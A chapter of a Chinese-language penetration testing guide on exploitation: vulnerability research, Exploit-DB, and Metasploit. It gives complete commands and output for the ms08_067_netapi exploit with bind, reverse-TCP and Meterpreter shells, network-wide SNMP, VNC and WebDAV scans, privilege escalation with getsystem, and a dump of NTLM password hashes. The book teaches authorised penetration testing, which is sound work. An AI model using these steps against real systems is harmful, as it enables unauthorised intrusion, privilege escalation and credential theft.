#
```
第9章 漏洞利用
漏洞利用是滲透測試的一個環節。脆弱性評估不涉及漏洞利用的有關測試。在摸索出目標的漏洞之後，測試人員會驗證並真刀真槍地利用目標系統的安全性漏洞，以進一步瞭解目標網路和運營系統，獲取更多資訊，甚至掌握完全控制權。本章講重點介紹實戰環境下使用的漏洞利用工具，並闡述漏洞利用的具體方法。

本章分為以下幾個部分。

9.1節介紹漏洞檢測的相關知識。漏洞檢測是理解、檢查、測試漏洞的基礎工作，是指導利用漏洞工作的重要環節。

9.2 節介紹漏洞和漏洞利用程式的資料庫（exploit repositories）。漏洞利用程式的資料庫是查找公開獲取exploit的重要途徑，它還描述了有關exploit的應用方法。

9.3節從評估目標安全性的角度，講解一款惡名遠揚的漏洞利用程式工具集及其使用方法。這部分內容清晰地演示了利用目標漏洞到獲取敏感資訊的各個步驟。本節還進行了細緻的案例說明。

本章的最後篇幅將簡要地介紹編寫Metasploit exploit 範本的具體步驟。

編寫漏洞利用程式（exploit）的程式碼都不僅費時費力，而且代碼的品質直接關係著整個工作環節的成敗。因此，滲透人員需要根據目標環境的實際情況對通過公開管道獲取的exploit程式進行相應調整。這種調整工作的技術含量很高，而且這類工作通常都是觸類旁通的。掌握相應技能的人員可以舉一反三地對很多程式進行調整。強烈建議讀者在編寫自己的漏洞利用程式之前，先通過公開管道獲取的的漏洞利用程式練手。

9.1 漏洞檢測
瞭解特定軟體或特定硬體設備的功能，可能就是挖掘其潛在漏洞的第一步。檢驗漏洞並不容易，絕非是一蹴而就之事。檢驗人員必須具備扎實的知識基礎，瞭解安全分析的各方面因素。漏洞檢測所需的安全分析技能分為以下幾種。

● 程式設計技能：這是稱職的守法駭客必須具備的基礎素質。掌握某種程式設計語言的基本原理和程式設計方法，是安全測試人員檢測程式漏洞的必備技能。除此之外，他還應當深入瞭解處理器、系統記憶體、緩衝區、指標、資料類型、寄存器和緩存等基礎概念。無論是C/C++、Python、Pert還是組合語言，幾乎所有程式設計語言的實現方式都與上述概念有關。根據現有漏洞編寫exploit程式的基本方法，請參閱http://www. phreedom.org/presentations/exploit-code-development/exploit-code-development.pdf。

● 逆向工程：漏洞挖掘工作同樣依賴測試人員的逆向工程技能。這種技術分析程式的具體函數、資料結構和演算法，可檢測出電子設備、軟體以及系統中潛藏的漏洞。逆向工程的反編譯技術，可在事先不知道內部結構情況下逆向解析出程式的原始程式碼，從而測試程式的錯誤條件、不完善的函數以及存在缺陷的協定，並能夠測試程式的邊界條件。專業的安全研究員都具備很高的逆向工程實戰能力。逆向工程可以用於去除軟體的版權保護、安全審計、分析技術競爭情報、侵權鑒定、研究軟體的交互性、掌握程式的工作機制，甚至破獲敏感性資料。逆向工程為應用安全的概念增加了兩個抽象層：原始程式碼級審計（source code auditing）和二進位（可執行程式）審計（binary auditing）。如果可以獲取程式的原始程式碼，審計人員可採用自動或手動的方式分析來源程式的安全問題，進而解析出可能觸發漏洞的邊界條件。另一方面，雖然測試人員可以在沒有源碼的情況下進行二進位審計，不過這種審計的效果不如原始程式碼審計理想。二進位審計通常都會用到兩種通用類型的輔助工具，即反組譯工具（disassemblers）和解編程式（decompilers）。反組譯工具可把編譯後的二進位程式反彙編成彙編指令，而反編譯器則把編譯後的二進位程式反編譯成高級程式語言的程式原始程式碼。然而，無論選用反組譯工具還是解編程式，成功的逆向安全工作都離不開審計人員扎實的技術實力和小心謹慎的評估態度。

● 熟悉檢測工具：檢測漏洞的工作依賴各種調試器、資料採擷器、模糊測試資料生成器、事件檢測器、代碼覆蓋分析器、流量分析器和記憶體監視器。對於檢驗漏洞的工作來說，漏洞檢測工具十分重要。它們同時還是測試專案的集成測試平臺。雖然 Kali Linux收錄了不少監測工具，但是本書並不會詳細講解每款工具。如需持續關注逆向工具的最新動態，請訪問線上的網路資料庫：http://www.woodmann.com/collaborative/tools/index.php/Category : RCE_Tools。

● 構建exploit和payload的技術實力：利用漏洞的最後一步工序就是編寫漏洞的PoC （Proof of Concept，概念驗證）程式，即shellcode。這種程式旨在使滲透測試人員在遠端目標主機上執行自訂的指令。根據逆向工程階段掌握的應用程式的具體缺陷，測試人員要編寫驗證漏洞的點睛之筆——shellcode程式。同時，他們還要防止shellcode存在缺陷，盡其所能地避免exploit（漏洞利用程式）出現崩潰問題。

要讓目標系統執行我們編寫的程式或我們所要執行的指令，就應當針對漏洞的類型和類別擬定針對性的策略。為了獲取目標作業系統的控制權，專業的滲透測試人員會盡力挖掘並綜合使用應用程式的各種安全缺陷。本章的後半部分將通過幾個場景演示 Metasploit框架的使用方法和相關技術。

9.2 漏洞和exploit資料庫
近些年來，公共領域持續報導了大量的程式漏洞。其屮一些漏洞存在 PoC。PoC 程式從一個側面驗證了 exploit（利用應用程式漏洞）的可行性。而且，並不是每個被發現的漏洞都會被立刻修補。在當今這個時代裡，人們爭先恐後地獲取exploit資訊和漏洞資訊。滲透測試人員同樣可以通過公開管道快速地檢索可適用於目標系統的exploit程式。如果具備了一定的程式設計技巧並掌握解作業系統的具體架構，您還可以將一種類型的exploit轉換為另一種exploit（例如，將Win32框架的exploit轉換為Linux架構的exploit程式）。本文將介紹一系列的網路資料庫，以助您追蹤漏洞資訊或查找適用的exploit程式。

請注意：網路上公開的漏洞資訊並不涵蓋全部已知漏洞。此外，雖然部分漏洞存在對應的PoC exploit程式，但是並非所有的安全性漏洞資訊都有公開的PoC代碼。在公開的漏洞資訊中，部分漏洞的描述資訊甚至可謂是言之無物。因此，“要在研究漏洞時參考多個網上資源”已經成為了眾多安全審計人員的共識。

figure_0236_0105

本文僅羅列了部分網路資源。Kali Linux集成了由“Offensive Security”提供的資料庫，可在您的系統上保存exploit的所有漏洞記錄，以便您日後參考和使用。如需查看Exploit-DB提供的資料，可在主機的shell中執行下述指令。

cd /usr/share/exploitdb/
vim files.csv
上述指令將列出Exploit-DB收錄的所有exploit資訊，即本機/usr/share/exploitdb/platforms/目錄下的檔清單和相關描述。Kali 以目標系統的類型對漏洞進行分類（Window、Linux、HP-UX、Novell、 Solaris、BSD、IRIX、TRU64、ASP、PHP 等），並把各種exploit的原始程式碼保存在相應的子目錄下。這些檔多數是C、Perl、Python、Ruby、PHP以及其他一些程式設計技術開發的exploit 原始程式碼。Kali Linux 已經收錄了執行exploit 程式所需的編譯器和解釋程式。

如何從exploits資訊中提取特定資訊？

通過作業系統的Bash 指令，您可以對文字檔的輸出內容進行過濾，從而篩選所需資訊。您可以通過 searchsploit 指令，或者是 cat files.csv | cut -d“,”-f3指令檢索特定的exploit。有關shell指令的基本用法，請查閱http://tldp.org/LDP/abs/html/index.html。

9.3 漏洞利用程式工具集
Kali Linux 預裝了幾款十分好用的髙級漏洞利用程式工具集，其中就有Metasploit 框架（http://www.metasploit.com）。本文將不僅會詳細地介紹這款工具，而且還會通過大量行之有效的應用場景來演示它的使用方法，以加深讀者對滲透測試的認識。Metasploit 框架是由Ruby程式語言編寫的範本化框架，具有很好的擴展性，便於滲透測試人員開發、使用定制的工具範本。Metasploit 的框架可以分為三大類組成部分：庫、介面和範本。本文重點關注各個介面和範本的功能。介面（控制台、CU、Web、GUI）基本上是調用功能範本（漏洞利用、有效載荷、輔助工具、加密引擎、NOP）的前端UI。Metasploit框架的每個範本都有不同的作用，它們大體可分為下述模組。

● exploit（漏洞利用程式範本）：包含各種 PoC 驗證程式，用於驗證利用特定漏洞（exploit）的可行性。

● payload（有效載荷範本）：包含各種惡意程式，用於在目標系統上運行任意命令。它可能是exploit的一部分，也可能是獨立編譯的應用程式。

● Auxiliaries（輔助工具範本）：包含一系列掃描、嗅探、撥號測試、指紋識別和其他類型的安全評估程式。

● Encoders（編碼工具範本）：在滲透測試中，這個範本用來加密有效載荷，以避免被殺毒軟體、防火牆、IDS/IPS以其他類似的反惡意軟體檢測出來。

● NOP（空操作範本）：這個範本用於在shellcode 中插入NOP（彙編指令）。雖然NOP不會進行實際的操作，但是在構造shellcode時可以用來暫時替代playload，形成完整的shellcode程式。

為了便於讀者理解，下文將演示兩個著名的Metasploit介面，並講解相關的指令行選項。每個介面都有各自的各有長處和短處。本文強烈建議讀者習慣使用console介面，因為它支援該框架的多數功能。

9.3.1 MSFConsole
MSFConsole是效率最高、功能最強大的高度集成的端介面之一。它便於滲透測試人員充分利用整個漏洞利用程式框架。如需使用 msfconsole ，可在桌面功能表裡依次選中Applications | Kali Linux | Exploitation Tools | Metasploit | metasploit framework，或在終端中執行下述指令。

msfconsole
上述指令將使用者帶入控制台類型的人機交互介面。如果需要瞭解所有可用的命令，可以輸人下述指令。

msf > help

上述指令將會顯示兩類命令。一類指令是在整個框架內通用的常規指令，另一類指令則是面向後臺資料庫的專用指令。後臺資料庫裡存儲著評估參數和評估結果。要想查看某個指令的選項說明，可以在有關指令的後面添加-h尾碼。例如，我們可通過下述指令查看show命令的使用說明。

msf > show -h

[*] Valid parameters for the "show" command are: all, encoders, nos, exploits, payloads, auxiliary, plugins, options

[*] Additional module-specific parameters are： advanced, evasion, targets, actions

上述命令通常用於顯示某個類型的可用範本，或者顯示所有範本。常用的指令如下所示。

● show auxiliary：列出全部的輔助工具範本。

● show exploits：列出框架下所有的漏洞利用程式。

● show payloads：列出所有平臺下的有效載荷。如果已經選定了一個漏洞利用程式，再使用該命令就只會顯示相關的載荷。例如，Windows的載荷將顯示與 Windows相關的漏洞利用範本。

● show encoders：顯示可用的編碼工具範本。

● show nops：顯示所有可用的NOP 生成程式。

● show options：顯示指定範本的全部設置和選項資訊。

● show targets：顯示exploit 支援的作業系統類型。

● show advanced：列出所有高級配置選項，以便進行微調。

我們將最具價值的幾個常用命令總結為下述表格。您可以在 Metasploit 的控制台（console）中進行上機練習。指令中的斜體字部分，是您來指定的參數。

figure_0239_0106

下一小節將詳細講解這些命令的使用方法，並演示整個框架各個範本的具體功能。

9.3.2 MSFCLI
MSFCLI和MSFConsole相似，它們不僅都採用了命令列介面，而且都可在所有的執行緒中操作絕大多數的範本。然而，MSFCLI的自動化程度沒有MSFConsole高。

如需啟動msfcli，可在終端中使用下述指令。

＃msfcli –h

上述指令將顯示所有可用的模式、模式的相關說明，以及指令所需的參數。請注意msfcli需要使用等號給參數進行賦值，而且所有的選項都區分大小寫。下述例子演示了選定、運行特定exploit範本的具體方法。

msfcli windows/smb/ms08_067_netapi O
[*] Please wait while we load the module tree...

Name　Current Setting　Required　Description

----　---------------　--------　-----------

RHOST　　　　　　yes　　The target address

RPORT　445　　　　yes　　Set the SMB service port

SMBPIPE　BROWSER　　　yes　　The pipe name to use (BROWSER,

SRVSVC)

上述指令結尾處的選項O，用於顯示指定exploit的全部選項。下述指令通過RHOST參數指定目標主機的IP位址。

msfcli windows/smb/ms08_067_netapi RHOST=192.168.0.7 P
[*] Please wait while we load the module tree...

Compatible payloads

===================

Name　　　　　　　Description

----　　　　　　-----------

generic/debug_trap　　　Generate a debug trap in the target process

generic/shell_bind_tcp　　Listen for a connection and spawn a command shell

...

在設置好RHOST參數指定了目標IP之後，就應當選取可行的payload，並執行我們選取的exploit。

msfcli windows/smb/ms08_067_netapi RHOST=192.168.0.7 LHOST =192.168.0.3 PAYLOAD=windows/shell/reverse_tcp E
[*] Please wait while we load the module tree...

[*] Started reverse handler on 192.168.0.3:4444

[*] Automatically detecting the target...

[*] Fingerprint: Windows XP Service Pack 2 - lang:English

[*] Selected Target: Windows XP SP2 English (NX)

[*] Attempting to trigger the vulnerability...

[*] Sending stage (240 bytes) to 192.168.0.7

[*] Command shell session 1 opened (192.168.0.3:4444 -> 192.168.0.7:1027)

Microsoft Windows XP Version 5.1.2600 Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>

上述資訊表明，在選定payload並設置好LHOST參數之後，我們獲取了目標主機的本地shell控制權。

9.3.3 忍者操練101
本節將講解漏洞利用框架的各種使用方法。儘管不可能完全展現Metasploit框架的各種功能，但是我們細緻地挑選了幾個案例，演示了它的最重要的功能。如需深入瞭解Metasploit框架，請參見官方的線上教程MetasploitUnleashed：http://www.offensive-security.com/metasploit-unleashed/。官方教程深入地講解了exploit範本開發、漏洞檢測以及各種評估技術。

場景1

這個場景將使用Metasploit框架組成的NMap程式進行埠掃描、OS指紋識別，以及服務鑒定。我們在MSFConsole中執行下述指令。

msf > load db_tracker

[*] Successfully loaded plugin: db_tracker

msf > db_nmap -T Aggressive -sV -n -O -v 192.168.0.7

Starting Nmap 5.00 ( http://nmap.org ) at 2010-11-11 22:34 UTC

NSE: Loaded 3 scripts for scanning.

Initiating ARP Ping Scan at 22:34

Scanning 192.168.0.7 [1 port]

Completed ARP Ping Scan at 22:34, 0.00s elapsed (1 total hosts)

Initiating SYN Stealth Scan at 22:34

Scanning 192.168.0.7 [1000 ports]

Discovered open port 445/tcp on 192.168.0.7

Discovered open port 135/tcp on 192.168.0.7

Discovered open port 25/tcp　on 192.168.0.7

Discovered open port 139/tcp on 192.168.0.7

Discovered open port 3389/tcp on 192.168.0.7

Discovered open port 80/tcp　on 192.168.0.7

Discovered open port 443/tcp on 192.168.0.7

Discovered open port 21/tcp　on 192.168.0.7

Discovered open port 1025/tcp on 192.168.0.7

Discovered open port 1433/tcp on 192.168.0.7

Completed SYN Stealth Scan at 22:34, 3.04s elapsed (1000 total ports)

Initiating Service scan at 22:34

Scanning 10 services on 192.168.0.7

Completed Service scan at 22:35, 15.15s elapsed (10 services on 1 host)

Initiating OS detection (try #1) against 192.168.0.7

...

PORT　　STATE SERVICE　　VERSION

21/tcp　　open　ftp　　　Microsoft ftpd

25/tcp　　open　smtp　　　Microsoft ESMTP 6.0.2600.2180

80/tcp　　open　http　　　Microsoft IIS httpd 5.1

135/tcp　open　msrpc　　Microsoft Windows RPC

139/tcp　open　netbios-ssn

443/tcpopen https?

445/tcp　open　microsoft-ds　Microsoft Windows XP microsoft-ds

1025/tcp　open　msrpc　　Microsoft Windows RPC

1433/tcp　open　ms-sql-s　　Microsoft SQL Server 2005 9.00.1399; RTM

3389/tcp　open　microsoft-rdp Microsoft Terminal Service

MAC Address: 00:0B:6B:68:19:91 (Wistron Neweb)

Device type: general purpose

Running: Microsoft Windows 2000|XP|2003

OS details: Microsoft Windows 2000 SP2 - SP4, Windows XP SP2 - SP3, orWindows Server 2003 SP0 - SP2

Network Distance: 1 hop

TCP Sequence Prediction: Difficulty=263 (Good luck!)

IP ID Sequence Generation: Incremental

Service Info: Host: custdesk; OS: Windows

...

Nmap done: 1 IP address (1 host up) scanned in 20.55 seconds

Raw packets sent: 1026 (45.856KB) | Rcvd: 1024 (42.688KB)

上述資訊表明，現在已經成功對目標進行掃描，並且掃描結果已經保存在當前的資料庫會話中。如需查看掃描階段識別出來的目標主機和系統服務，可單獨使用db_hosts和db_services指令。另外，如果您單獨使用NMAP程式掃描過目標主機，而且已經把掃描報告保存為XML格式的檔，那麼可以使用db_import_nmap_xml命令把Nmap的掃描報告導入到Metasploit的資料庫裡。

場景2

這個場景將演示 Metasploit 框架的輔助工具（auxiliaries）範本的使用方法，旨在説明讀者瞭解輔助工具範本在滲透測試過程中的重要作用。

SNMP字串掃描程式

這個範本可以對指定網段進行SNMP（Simple Network Management Protocol）掃描，並使用常見的團體字元對SNMP進行測試，最終顯示它識別出來的SNMP設備資訊。我們來看：

msf > search snmp

[*] Searching loaded modules for pattern 'snmp'...

Auxiliary

=========

Name　　　　　　Disclosure Date　Rank　Description

----　　　　　　--------------　----　-----------

scanner/snmp/aix_version　　　　　　normal　AIX SNMP

Scanner AuxiliaryModule

scanner/snmp/community　　　　　　　normal　SNMP Community

Scanner

……

msf > use auxiliary/scanner/snmp/community

msf auxiliary(community) > show options

Module options:

Name　　Current Setting

Required　Description

----　　---------------　　　　　　　　　-----

BATCHSIZE　256　　　　　　　　　　　　yes

The number of hosts to probe in each set

CHOST　　　　　　　　　　　　　　　no

The local client address

COMMUNITIES /opt/metasploit3/msf3/data/wordlists/snmp.txt　　no

The list of communities that should be attempted per host

RHOSTS　　　　　　　　　　　　　　yes

The target address range or CIDR identifier

RPORT　　161　　　　　　　　　　　　yes

The target port

THREADS　　1　　　　　　　　　　　　　yes

The number of concurrent threads

msf auxiliary(community) > set RHOSTS 10.2.131.0/24

RHOSTS => 10.2.131.0/24

msf auxiliary(community) > set THREADS 3

THREADS => 3

msf auxiliary(community) > set BATCHSIZE 10

BATCHSIZE => 10

msf auxiliary(community) > run

[*] >> progress (10.2.131.0-10.2.131.9) 0/170...

[*] >> progress (10.2.131.10-10.2.131.19) 0/170...

[*] >> progress (10.2.131.20-10.2.131.29) 0/170...

[*] Scanned 030 of 256 hosts (011% complete)

[*] >> progress (10.2.131.30-10.2.131.39) 0/170...

[*] >> progress (10.2.131.40-10.2.131.49) 0/170...

[*] >> progress (10.2.131.50-10.2.131.59) 0/170...

[*] Scanned 060 of 256 hosts (023% complete)

[*] >> progress (10.2.131.60-10.2.131.69) 0/170...

[*] >> progress (10.2.131.70-10.2.131.79) 0/170...

[*] Scanned 080 of 256 hosts (031% complete)

[*] >> progress (10.2.131.80-10.2.131.89) 0/170...

[*] >> progress (10.2.131.90-10.2.131.99) 0/170...

[*] >> progress (10.2.131.100-10.2.131.109) 0/170...

[*] 10.2.131.109 'public' 'HP ETHERNET MULTI-ENVIRONMENT,ROM none,JETDIRECT,JD128,EEPROM V.33.19,CIDATE 12/17/2008'

[*] Scanned 110 of 256 hosts (042% complete)

...

[*] >> progress (10.2.131.240-10.2.131.249) 0/170...

[*] >> progress (10.2.131.250-10.2.131.255) 0/102...

[*] Scanned 256 of 256 hosts (100% complete)

[*] Auxiliary module execution completed

上述資訊表明，程式識別出了一個啟用SNMP 功能的設備，而且該設備可以受理團體字串 public。雖然通過字串 public 獲取的許可權只是該設備的唯讀許可權，但是我們仍然可以獲取大量有價值的資訊。這些資訊可能包括系統資料、正在運行的服務程式、網路位址、版本號和補丁資訊等。

VNC空密碼掃描程式

這個範本將會掃描指定的網段，以搜索可以使用空密碼訪問的虛機網路計算（Virtual Network Computing，VNC）伺服器。進行掃描的指令如下。

msf > use auxiliary/scanner/vnc/vnc_none_auth

msf auxiliary(vnc_none_auth) > show options

msf auxiliary(vnc_none_auth) > set RHOSTS 10.4.124.0/24

RHOSTS => 10.4.124.0/24

msf auxiliary(vnc_none_auth) > run

[*] 10.4.124.22:5900, VNC server protocol version : "RFB 004.000", not supported!

[*] 10.4.124.23:5900, VNC server protocol version : "RFB 004.000", not supported!

[*] 10.4.124.25:5900, VNC server protocol version : "RFB 004.000",not supported!

[*] Scanned 026 of 256 hosts (010% complete)

[*] 10.4.124.26:5900, VNC server protocol version : "RFB 004.000",not supported!

[*] 10.4.124.27:5900, VNC server security types supported : None,free access!

[*] 10.4.124.28:5900, VNC server security types supported : None,free access!

[*] 10.4.124.29:5900, VNC server protocol version : "RFB 004.000",not supported!

...

[*] 10.4.124.224:5900, VNC server protocol version : "RFB 004.000",not supported!

[*] 10.4.124.225:5900, VNC server protocol version : "RFB 004.000",not supported!

[*] 10.4.124.227:5900, VNC server security types supported : None,free access!

[*] 10.4.124.228:5900, VNC server protocol version : "RFB 004.000",not supported!

[*] 10.4.124.229:5900, VNC server protocol version : "RFB 004.000",not supported!

[*] Scanned 231 of 256 hosts (090% complete)

[*] Scanned 256 of 256 hosts (100% complete)

[*] Auxiliary module execution completed

上述資訊表明，Metasploit框架確實找到了很多無需驗證就可訪問的VNC伺服器。若不採取身份認證的存取控制措施，這些主機將會招引不速之客訪問VNC伺服器，終將成為系統管理員的一大威脅。

IIS6 WebDAV Unicode 身份驗證旁路漏洞

這個範本將會掃描指定的網段，以搜索存在IIS6 WebDAV 認證旁路漏洞的主機。啟動掃描任務的指令如下。

msf > use auxiliary/scanner/http/ms09_020_webdav_unicode_bypass

msf auxiliary(ms09_020_webdav_unicode_bypass) > show options

msf auxiliary(ms09_020_webdav_unicode_bypass) > set RHOSTS

10.8.183.0/24

RHOSTS => 10.8.183.0/24

msf auxiliary(ms09_020_webdav_unicode_bypass) > set THREADS 10

THREADS => 10

msf auxiliary(ms09_020_webdav_unicode_bypass) > run

[-] Folder does not require authentication. [302]

[-] Folder does not require authentication. [400]

[*] Confirmed protected folder http://10.8.183.9:80/ 401 (10.8.183.9)

[*]　Testing for unicode bypass in IIS6 with WebDAV enabled using

PROPFIND request.

[-] Folder does not require authentication. [403]

[-] Folder does not require authentication. [302]

[-] Folder does not require authentication. [501]

[-] Folder does not require authentication. [501]

...

[*] Confirmed protected folder http://10.8.183.162:80/ 401(10.8.183.162)

[*]　Testing for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.

...

[*] Confirmed protected folder http://10.8.183.155:80/ 401(10.8.183.155)

[*]　Testing for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.

[*] Confirmed protected folder http://10.8.183.166:80/ 401(10.8.183.166)

[*]Testing for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.

[*] Confirmed protected folder http://10.8.183.168:80/ 401(10.8.183.168)

[*]　Testing for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.

[*] Confirmed protected folder http://10.8.183.167:80/ 401(10.8.183.167)

[*]　Testing for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.

[-] Folder does not require authentication. [501]

[*] Confirmed protected folder http://10.8.183.171:80/ 401(10.8.183.171)

[*]　Testing for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.

[-] Folder does not require authentication. [501]

[-] Folder does not require authentication. [501]

...

[-] Folder does not require authentication. [302]

[*] Confirmed protected folder http://10.8.183.178:80/ 401(10.8.183.178)

[*]　Testing for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.

[-] Folder does not require authentication. [501]

[-] Folder does not require authentication. [501]

[*] Scanned 182 of 256 hosts (071% complete)

[-] Folder does not require authentication. [501]

[*] Confirmed protected folder http://10.8.183.183:80/ 401(10.8.183.183)

[*]　Testing for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.

[-] Folder does not require authentication. [302]

[*] Confirmed protected folder http://10.8.183.188:80/ 401(10.8.183.188)

[*]　Testing for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.

...

[-] Folder does not require authentication. [405]

[*] Scanned 256 of 256 hosts (100% complete)

[*] Auxiliary module execution completed

上述資訊表明，Metasploit 框架完成了對目標網段的掃描，已經找到了存在 MS09-020 IIS6 WebDAV Unicode Authentication Bypass漏洞的主機。或許，這種範本有助於我們發現網路中配置不當的伺服器，提前發現安全隱患。

場景3

這個場景將會介紹幾種常見的payload（bind、reverse 和meterpreter shell），並且以漏洞利用的角度探討它們的功能。這些實例還將展示payload的使用方法和時機。

bind shell

bind（綁定型）shell用於提供遠端shell連接。在成功利用了目標主機上的安全性漏洞，並且成功執行了shellcode程式以後，滲透人員可在目標主機上的特定埠上運行bind shell，以讓其他主機繼續控制這台主機。攻擊人員可以使用基於 TCP 連接的標準輸入輸出（stdin/stdout）隧道工具（例如 Netcat）連接到被攻破的主機，通過 bind shell 繼續實施控制。它的應用場合與 Telnet 伺服器/用戶端十分相似，主要適用於以 NAT（Network Address Translation）方式連入網路的滲透人員、攻擊人員的設備與目標主機之間有防火牆的情況，即適用於無法從被測主機直接連接到攻擊人員主機IP的各種情況。

可通過下述指令利用主機漏洞並安裝bind shell。

msf > use exploit/windows/smb/ms08_067_netapi

msf exploit(ms08_067_netapi) > show options

msf exploit(ms08_067_netapi) > set RHOST 192.168.0.7

RHOST => 192.168.0.7

msf exploit(ms08_067_netapi) > set PAYLOAD windows/shell/bind_tcp

PAYLOAD => windows/shell/bind_tcp

msf exploit(ms08_067_netapi) > exploit

[*] Started bind handler

[*] Automatically detecting the target...

[*] Fingerprint: Windows XP Service Pack 2 - lang:English

[*] Selected Target: Windows XP SP2 English (NX)

[*] Attempting to trigger the vulnerability...

[*] Sending stage (240 bytes) to 192.168.0.7

[*] Command shell session 1 opened (192.168.0.3:41289 ->

192.168.0.7:4444) at Sat Nov 13 19:01:23 +0000 2010

Microsoft Windows XP [Version 5.1.2600]

(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>

上述資訊表明，Metasploit 通過集成的payload 處理常式自動連接到了bind shell。我們可以自己編寫shellcode，利用exploit 程式安裝bind shell，然後再使用Netcat 這類協力廠商工具連接到 bind shell。有關 netcat 在網路安全測試中的各種用途的實例說明，請參見http://en.wikipedia.org/wiki/Netcat。

reverse shell

reverse（反射型）shell與綁定型（bind）shell截然不同。reverse shell不是在目的機器上綁定埠，被動地受理攻擊人員的機器連接，而是採用反彈的方法，讓被測主機主動地連接攻擊者的IP和埠，並提供一個shell。reverse shell適用於被測主機採用NAT方式連接網路的情況，或者被測主機受防火牆保護而使滲透人員不能從外網直接訪問被測主機的各種情況。

下述指令可設置安裝reverse shell。

msf > use exploit/windows/smb/ms08_067_netapi

msf exploit(ms08_067_netapi) > set RHOST 192.168.0.7

RHOST => 192.168.0.7

msf exploit(ms08_067_netapi) > set PAYLOAD windows/shell/reverse_tcp

PAYLOAD => windows/shell/reverse_tcp

msf exploit(ms08_067_netapi) > show options

msf exploit(ms08_067_netapi) > set LHOST 192.168.0.3

LHOST => 192.168.0.3

msf exploit(ms08_067_netapi) > exploit

[*] Started reverse handler on 192.168.0.3:4444

[*] Automatically detecting the target...

[*] Fingerprint: Windows XP Service Pack 2 - lang:English

[*] Selected Target: Windows XP SP2 English (NX)

[*] Attempting to trigger the vulnerability...

[*] Sending stage (240 bytes) to 192.168.0.7

[*] Command shell session 1 opened (192.168.0.3:4444 ->

192.168.0.7:1027) at Sat Nov 13 22:59:02 +0000 2010

Microsoft Windows XP [Version 5.1.2600]

(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>

在安裝reverse shell 時需配置攻擊者的IP（例如LHOST 192.168.0.3），而在安裝（綁定型）bind shell 則沒有這項設置。

inline payload和staged payload 的區別有哪些？

inline payload屬於自主型shellcode，它的shellcode和exploit都在同一個程式檔裡。而 staged payload 在兩台主機之間建立通信隧道，並通過隧道執行shellcode程式。如果對payload的檔尺寸有嚴格要求，那麼可使用 staged payload，因為它的檔尺寸比 inline payload的檔小得多。

Meterpreter

Meterpreter是一種先進的、隱蔽的、多功能的、可動態擴展的payload，它可在目標主機的系統記憶體裡注入DLL（注入的DLL完全不會以檔形式存在）。此外，它還支持在運行期間載入腳本和外掛程式。在漏洞利用的後期階段，它的動態載入特性極大地拓寬了滲透人員的作業空間，方便了提權、保存系統帳號、進行關鍵記錄、駐留性後門服務、開啟遠端桌面等各種操作。預設情況下，Meterpreter shell 會採用全程加密的通信方式。

可通過下述指令利用漏洞並安裝Meterpreter payload。

msf > use exploit/windows/smb/ms08_067_netapi

msf exploit(ms08_067_netapi) > set RHOST 192.168.0.7

RHOST => 192.168.0.7

msf exploit(ms08_067_netapi) > show payloads

...

msf exploit(ms08_067_netapi) > set PAYLOAD

windows/meterpreter/reverse_tcp

PAYLOAD => windows/meterpreter/reverse_tcp

msf exploit(ms08_067_netapi) > show options

...

msf exploit(ms08_067_netapi) > set LHOST 192.168.0.3

LHOST => 192.168.0.3

msf exploit(ms08_067_netapi) > exploit

[*] Started reverse handler on 192.168.0.3:4444

[*] Automatically detecting the target...

[*] Fingerprint: Windows XP Service Pack 2 - lang:English

[*] Selected Target: Windows XP SP2 English (NX)

[*] Attempting to trigger the vulnerability...

[*] Sending stage (749056 bytes) to 192.168.0.7

[*] Meterpreter session 1 opened (192.168.0.3:4444 ->

192.168.0.7:1029) at Sun Nov 14 02:44:26 +0000 2010

meterpreter > help

...

通過上述指令，我們成功地連接到了被測主機的Meterpreter shell，然後我們通過help查看各種可用的命令。下一步，我們要査看當前用戶的操作許可權，然後通過 getsystem腳本提升自己的許可權為系統許可權。

meterpreter > getuid

Server username: CUSTDESK\salesdept

meterpreter > use priv

meterpreter > getsystem -h

...

上述指令將會顯示提升許可權的各種技術。如果不啟用任何選項，直接使用getsystem指令將會逐一嘗試各種提權技術，直到成功提升到系統許可權為止。

meterpreter > getsystem

...got system (via technique 1).

meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM

meterpreter > sysinfo

Computer: CUSTDESK

OS　　: Windows XP (Build 2600, Service Pack 2).

Arch　: x86

Language: en_US

如果在指令中啟用exploit -j -z選項，那麼漏洞利用程式將會在後臺運行，您也不會進入互動式的Meterpreter shell。但是，如果程式成功建立了會話，您可以通過sessions -i id指令返回shell的交互介面。如需瞭解會話的ID，可使用sessions -l指令查看ID的確切值。

接下來，我們要獲取被測主機的系統帳戶和密碼。Windows以NTLM雜湊（hash）的格式保存使用者的帳號資訊。很多工具和技術都可以破解 NTLM 雜湊。現在我們一起見證Meterpreter的真正威力。

meterpreter > run hashdump

[*] Obtaining the boot key...

[*] Calculating the hboot key using SYSKEY 71e52ce6b86e5da0c213566a123

6f892...

[*] Obtaining the user list and keys...

[*] Decrypting user keys...

[*] Dumping password hashes...

h

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e 0c089c0:::

Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c08 9c0:::

HelpAssistant:1000:d2cd5d550e14593b12787245127c866d:d3e35f657c924d0b31eb 811d2d986df9:::

SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:c8edf0d0db48cbf7b 2835ec013cfb9c5:::

Momin Desktop:1003:ccf9155e3e7db453aad3b435b51404ee:3dbde697d71690a769204 beb12283678:::

IUSR_MOMINDESK:1004:a751dcb6ea9323026eb8f7854da74a24:b0196523134dd9a21bf 6b80e02744513:::

ASPNET:1005:ad785822109dd077027175f3382059fd:21ff86d627bcf380a5b1b6abe5d 8e1dd:::

IWAM_MOMINDESK:1009:12a75a1d0cf47cd0c8e2f82a92190b42:c74966d83d519ba41e5 196e00f94e113:::

